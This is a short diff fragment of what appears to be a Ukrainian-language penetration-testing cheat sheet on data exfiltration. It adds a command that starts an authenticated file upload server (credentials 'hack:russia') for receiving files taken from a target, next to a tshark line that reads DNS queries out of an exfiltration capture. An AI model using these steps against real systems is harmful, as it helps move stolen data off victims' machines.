@@ -230,6 +230,10 @@ tshark -r exfil.pcap -Y "dns.qry.name" -T fields -e dns.qry.name
 ```bash
 pip install uploadserver & python3 -m uploadserver
 ```
+### 🔸 Із авторизацією:
+```bash
+pip install uploadserver & python3 -m uploadserver --basic-auth hack:russia
+```
 
 ### 🔸 На таргеті:
 ```bash
